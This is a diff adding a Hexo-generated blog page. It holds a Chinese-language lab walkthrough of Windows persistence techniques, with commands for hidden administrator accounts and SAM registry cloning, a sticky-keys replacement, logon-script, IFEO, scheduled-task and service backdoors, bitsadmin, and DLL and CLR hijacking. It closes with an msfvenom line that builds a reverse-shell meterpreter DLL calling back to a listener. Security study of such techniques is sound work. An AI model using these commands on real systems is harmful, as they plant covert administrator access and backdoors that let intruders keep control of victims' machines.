@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="影子账户通过如下命令创建隐藏用户并加入管理员组 12net user hide$ 123456 &#x2F;addnet localgroup administrators hide$ &#x2F;add">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows权限维持">
+<meta property="og:url" content="http://example.com/2024/04/17/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="影子账户通过如下命令创建隐藏用户并加入管理员组 12net user hide$ 123456 &#x2F;addnet localgroup administrators hide$ &#x2F;add">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240410211033049.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240410211209328.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240410212426218.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240410214733109.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240410214846130.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240410220447135.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240410220631351.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240410220936656.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240410221005030.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240415203743163.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240415210717352.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240415210744356.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240415210845380.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240415210900619.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240415214815195.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240416191420949.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240416194701199.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240416194825575.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240416195811219.png">
+<meta property="article:published_time" content="2024-04-17T03:10:58.000Z">
+<meta property="article:modified_time" content="2025-05-25T03:28:44.063Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ilikeoyt.github.io/image/image-20240410211033049.png">
+
+<link rel="canonical" href="http://example.com/2024/04/17/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Windows权限维持 | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/04/17/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Windows权限维持
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-04-17 11:10:58" itemprop="dateCreated datePublished" datetime="2024-04-17T11:10:58+08:00">2024-04-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-05-25 11:28:44" itemprop="dateModified" datetime="2025-05-25T11:28:44+08:00">2025-05-25</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="影子账户"><a href="#影子账户" class="headerlink" title="影子账户"></a>影子账户</h2><p>通过如下命令创建隐藏用户并加入管理员组</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user hide$ 123456 /add</span><br><span class="line">net localgroup administrators hide$ /add</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<p><img src="https://ilikeoyt.github.io/image/image-20240410211033049.png" alt="image-20240410211033049"></p>
+<p>可以发现使用net user查看账户无法看到hide用户，但是在计算机管理页面中依旧可以看到</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240410211209328.png" alt="image-20240410211209328"></p>
+<p>解决方法是修改注册表</p>
+<p>打开HKEY_LOCAL_MACHINE\SAM\SAM，修改SAM的权限，赋予administrators完全控制权限</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240410212426218.png" alt="image-20240410212426218"></p>
+<p>重新启动注册表</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240410214733109.png" alt="image-20240410214733109"></p>
+<p>可以看到hide用户对应的16进制位3eb，找到对应的文件夹，将其导出</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240410214846130.png" alt="image-20240410214846130"></p>
+<p>并同时将hide文件夹和Administrators对应的F4文件夹导出</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240410220447135.png" alt="image-20240410220447135"></p>
+<p>将eb.reg的F值替换为f4.reg的F值</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240410220631351.png" alt="image-20240410220631351"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Domains\\Account\\Users下存放的就是各个账号的信息，当然，这里是加密过的二进制数据，每个账号下面有两个子项，F和V。项目V中保存的是账户的基本资料，用户名、所属组、描述、密码、注释、是否可以更改密码、账户启用、密码设置时间等。项目F中保存的是一些登录记录，比如上次登录时间、错误登录次数等。</span><br></pre></td></tr></table></figure>
+
+<p>执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net user hide$ /del //删除hide用户</span><br><span class="line">regedit /s hide.reg</span><br><span class="line">regedit /s eb.reg</span><br></pre></td></tr></table></figure>
+
+<p>此时用户管理界面已经没有hide用户了</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240410220936656.png" alt="image-20240410220936656"></p>
+<p>并且我们依旧可以通过hide$用户连接</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240410221005030.png" alt="image-20240410221005030"></p>
+<p>现在只能在注册表中才能看到隐藏用户</p>
+<h2 id="粘滞键后门"><a href="#粘滞键后门" class="headerlink" title="粘滞键后门"></a>粘滞键后门</h2><p>粘滞键指的是电脑使用中的一种快捷键，专为同时按下两个或多个键有困难的人而设计的。粘滞键的主要功能是方便Shift等键的组合使用。一般的电脑连按五次shift会出现粘滞键提示</p>
+<p>粘滞键位置：c:\windows\system32\sethc.exe</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240415203743163.png" alt="image-20240415203743163"></p>
+<p>我们可以将粘滞键exe替换为cmd的exe，这样在尝试执行粘滞键操作也就是连击5次shift键后，就会弹出命令框</p>
+<p>首先更改一下控制权</p>
+<p>将所有者改为administrator</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240415210717352.png" alt="image-20240415210717352"></p>
+<p>并将administrator修改为完全控制</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240415210744356.png" alt="image-20240415210744356"></p>
+<p>然后执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy sethc.exe sethc1.exe</span><br><span class="line">copy cmd.exe setch.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ilikeoyt.github.io/image/image-20240415210845380.png" alt="image-20240415210845380"></p>
+<p>连击5次粘滞键：</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240415210900619.png" alt="image-20240415210900619"></p>
+<h2 id="Logon-Scripts后门"><a href="#Logon-Scripts后门" class="headerlink" title="Logon Scripts后门"></a>Logon Scripts后门</h2><p>Windows登录脚本，当用户登录时触发，Logon Scripts能够优先于杀毒软件执行，绕过杀毒软件对敏感操作的拦截。</p>
+<p>注册表位置:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Environment</span><br></pre></td></tr></table></figure>
+
+<p>使用powershell执行如下命令（用于修改对应注册表）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-ItemProperty &quot;HKCU:Environment&quot; UserInitMprLogonScript -value &quot;C:\Windows\System32\cmd.exe&quot; -propertyType string | Out-Null</span><br></pre></td></tr></table></figure>
+
+<p>重新注销后登录，即可发现自动弹出了cmd</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240415214815195.png" alt="image-20240415214815195"></p>
+<p>我们也可以将cmd.exe替换为我们的木马文件，用于持久化，只要计算机启动便可上线</p>
+<h2 id="映像劫持"><a href="#映像劫持" class="headerlink" title="映像劫持"></a>映像劫持</h2><p>“映像劫持”，也被称为“IFEO”（Image File Execution Options），在WindowsNT架构的系统里，IFEO的本意是为一些在默认系统环境中运行时可能引发错误的程序执行体提供特殊的环境设定。</p>
+<p>当我们双击运行程序时，系统会查询该IFEO注册表，如果发现存在和该程序名称完全相同的子键，就查询对应子健中包含的“debugger”键值名，如果该参数不为空，系统则会把 Debugger 参数里指定的程序文件名作为用户试图启动的程序执行请求来处理。这样成功执行的是遭到“劫持”的虚假程序。</p>
+<p>注册表位置：HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\</p>
+<p>在此注册表位置添加项sethc.exe，添加debugger键的值为c:\windows\system32\cmd.exe</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; /v &quot;Debugger&quot; /t REG_SZ /d &quot;c:\windows\system32\cmd.exe&quot; /f</span><br></pre></td></tr></table></figure>
+
+<p>进行粘滞键操作时，会弹出命令行</p>
+<h2 id="计划任务后门"><a href="#计划任务后门" class="headerlink" title="计划任务后门"></a>计划任务后门</h2><p>使用schtasks创建恶意的后门exe</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Create /tn Updater /tr C:\Windows\system32\cmd.exe /sc minute /mo 5</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>/Create</code>：指定创建计划任务。</li>
+<li><code>/tn Updater</code>：指定计划任务的名称为 “Updater”。你可以替换为你想要的名称。</li>
+<li><code>/tr C:\Windows\system32\cmd.exe</code>：指定要运行的命令或程序。在这种情况下，它是 <code>cmd.exe</code> 命令提示符。</li>
+<li><code>/sc minute</code>：指定计划任务的触发器类型为分钟触发器。这意味着任务将按分钟间隔运行。</li>
+<li><code>/mo 5</code>：指定任务运行的间隔时间为 5 分钟。</li>
+</ul>
+<p>查看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks | findstr /i &quot;updater&quot;</span><br></pre></td></tr></table></figure>
+
+<p>可能会出现<code>错误：无法加载列资源</code>的问题，修改一下编码即可：<code>chcp 437</code></p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240416191420949.png" alt="image-20240416191420949"></p>
+<h2 id="服务自启动后门"><a href="#服务自启动后门" class="headerlink" title="服务自启动后门"></a>服务自启动后门</h2><p>自启动服务一般是在电脑启动后在后台加载指定的服务程序，我们可以将exe文件注册为服务，也可以将dll文件注册为服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc create update start= auto binPath= &quot;C:\Windows\system32\cmd.exe&quot; obj= Localsystem depend= Tcpip</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ilikeoyt.github.io/image/image-20240416194701199.png" alt="image-20240416194701199"></p>
+<p>emmm，但是重启之后并未弹出cmd，不太清楚哪里出错了…..</p>
+<p>当然，在应急响应时，我们可以通过<code>sc qc update</code>查看详细服务信息</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240416194825575.png" alt="image-20240416194825575"></p>
+<h2 id="组策略设置脚本启动"><a href="#组策略设置脚本启动" class="headerlink" title="组策略设置脚本启动"></a>组策略设置脚本启动</h2><p>首先创建一个脚本，此处为添加隐藏用户，内容如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line"> </span><br><span class="line">net user test$ Test123890. /add</span><br><span class="line"> </span><br><span class="line">net localgroup administrators test$ /add</span><br><span class="line"> </span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
+
+<p>打开组策略配置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpedit.msc</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ilikeoyt.github.io/image/image-20240416195811219.png" alt="image-20240416195811219"></p>
+<p>这样之后，每次关机便会自动执行相关脚本</p>
+<h2 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h2><p>BITS (后台智能传送服务) 是一个 Windows 组件，它可以在前台或后台异步传输文件，为保证其他网络应用程序获得响应而调整传输速度，并在重新启动计算机或重新建立网络连接之后自动恢复文件传输</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /create test   //创建任务test</span><br><span class="line"> </span><br><span class="line">bitsadmin /addfile test c:\windows\system32\calc.exe c:\Users\ycxlo\Desktop\calc.exe</span><br><span class="line"> </span><br><span class="line">bitsadmin /SetNotifyCmdLine test cmd.exe &quot;cmd.exe /c calc.exe&quot;</span><br><span class="line"> </span><br><span class="line">bitsadmin /resume test</span><br></pre></td></tr></table></figure>
+
+<p>第二行命令也可以支持远程下载文件到本地</p>
+<p>后续按网上说的重启之后没效果，但阴差阳错我打开一个zip文件时，命令成功执行了…</p>
+<p>感觉就是在文件传输时这个命令就会起作用</p>
+<h2 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h2><p>当一个可执行文件运行时，Windows加载器会将PE(Portable Executable File Format)文件映射到内存中，然后分析可执行文件的导入表，并将相应的DLL文件装入，EXE文件通过导入表找到DLL中相应的函数，从而运行相应的函数。</p>
+<p>导入表中只有DLL名，并不存在任何路径信息，因此Windows加载器必须在磁盘上搜索DLL文件。搜索顺序为：当前程序所在的目录-&gt;Windows系统目录-&gt;环境变量。利用这个特点，可以伪造一个系统同名DLL放在程序目录下，当提供相同的输出表，当EXE加载DLL时会首先会搜索当前目录下DLL并装入，调用DLL函数时，伪造的DLL将程序所调用的函数全部转发至系统真实DLL中，并在此过程中完成恶意功能。此种方式被称之为DLL劫持。</p>
+<p>在Windows7及以上系统采用了KnownDLLs</p>
+<p>注册表位置：\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</p>
+<p>在此项下的DLL会被禁止从EXE自身所在目录下调用，而只能从系统目录即SYSTEM32目录下调用</p>
+<p>具体利用参考这篇文章吧（不想下载vs</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/241946.html">https://www.freebuf.com/articles/system/241946.html</a></p>
+<h2 id="无需管理员权限的CLR劫持"><a href="#无需管理员权限的CLR劫持" class="headerlink" title="无需管理员权限的CLR劫持"></a>无需管理员权限的CLR劫持</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CLR全称Common Language Runtime（公共语言运行库），是一个可由多种编程语言使用的运行环境。</span><br><span class="line"></span><br><span class="line">CLR是.NET Framework的主要执行引擎，作用之一是监视程序的运行：</span><br><span class="line"></span><br><span class="line">在CLR监视之下运行的程序属于“托管的”（managed）代码</span><br><span class="line"></span><br><span class="line">不在CLR之下、直接在裸机上运行的应用或者组件属于“非托管的”（unmanaged）的代码</span><br></pre></td></tr></table></figure>
+
+<p>通过修改环境变量，使<code>CLR</code>作用于全局，从而劫持所有<code>.net</code>程序的启动。</p>
+<p><code>CLR</code>需要配置环境变量才可以完全劫持<code>.net</code>。</p>
+<p>输入如下命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SETX COR_ENABLE_PROFILING 1 /M     设置环境变量为1</span><br><span class="line">SETX COR_PROFILER &#123;11111111-1111-1111-1111-111111111111&#125; /M</span><br></pre></td></tr></table></figure>
+
+<p><strong>注：</strong></p>
+<p>{11111111-1111-1111-1111-111111111111}表示CLSID</p>
+<p>可设置为任意数值，只要不和系统常用CLSID冲突就好</p>
+<p>使用弹框dll，下载地址：</p>
+<p><a href="https://link.zhihu.com/?target=https://raw.githubusercontent.com/3gstudent/test/master/msg.dll">https://raw.githubusercontent.com/3gstudent/test/master/msg.dll</a></p>
+<p>dll开发过程可参考：</p>
+<p><a target="_blank" rel="noopener" href="https://3gstudent.github.io/3gs">https://3gstudent.github.io/3gs</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;11111111-1111-1111-1111-111111111111&#125;\InProcServer32&quot; /VE /T REG_SZ /D &quot;C:\Windows\System32\test.dll&quot; /F</span><br><span class="line"></span><br><span class="line">REG ADD &quot;HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;11111111-1111-1111-1111-111111111111&#125;\InProcServer32&quot; /V ThreadingModel /T REG_SZ /D Apartment /F</span><br></pre></td></tr></table></figure>
+
+<p>然后按道理输入powershell即可弹窗，但是感觉我windows版本有点问题？？更换msf生成的反弹shell的dll文件也不行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.30.130 LPORT=444 -f dll &gt; test.dll</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://ilikeoyt.github.io/2024/02/26/Weblogic-T3%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"> Weblogic T3协议反序列化</a></p>
+<p><a target="_blank" rel="noopener" href="https://ilikeoyt.github.io/2024/05/12/%E8%AE%B0%E4%B8%80%E6%AC%A1Thinkphp%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/">记一次Thinkphp远程调试 </a></p>
+<p>© 2024 ycxlo</p>
+<p>Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> &amp; <a target="_blank" rel="noopener" href="https://muse.theme-next.org/">NexT.Muse</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/02/26/Weblogic-T3%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="prev" title="Weblogic T3协议反序列化">
+      <i class="fa fa-chevron-left"></i> Weblogic T3协议反序列化
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2024/05/12/%E8%AE%B0%E4%B8%80%E6%AC%A1Thinkphp%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/" rel="next" title="记一次Thinkphp远程调试">
+      记一次Thinkphp远程调试 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%AD%90%E8%B4%A6%E6%88%B7"><span class="nav-number">1.</span> <span class="nav-text">影子账户</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8"><span class="nav-number">2.</span> <span class="nav-text">粘滞键后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Logon-Scripts%E5%90%8E%E9%97%A8"><span class="nav-number">3.</span> <span class="nav-text">Logon Scripts后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81"><span class="nav-number">4.</span> <span class="nav-text">映像劫持</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%90%8E%E9%97%A8"><span class="nav-number">5.</span> <span class="nav-text">计划任务后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E8%87%AA%E5%90%AF%E5%8A%A8%E5%90%8E%E9%97%A8"><span class="nav-number">6.</span> <span class="nav-text">服务自启动后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%84%E7%AD%96%E7%95%A5%E8%AE%BE%E7%BD%AE%E8%84%9A%E6%9C%AC%E5%90%AF%E5%8A%A8"><span class="nav-number">7.</span> <span class="nav-text">组策略设置脚本启动</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bitsadmin"><span class="nav-number">8.</span> <span class="nav-text">bitsadmin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DLL%E5%8A%AB%E6%8C%81"><span class="nav-number">9.</span> <span class="nav-text">DLL劫持</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A0%E9%9C%80%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%E7%9A%84CLR%E5%8A%AB%E6%8C%81"><span class="nav-number">10.</span> <span class="nav-text">无需管理员权限的CLR劫持</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">57</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
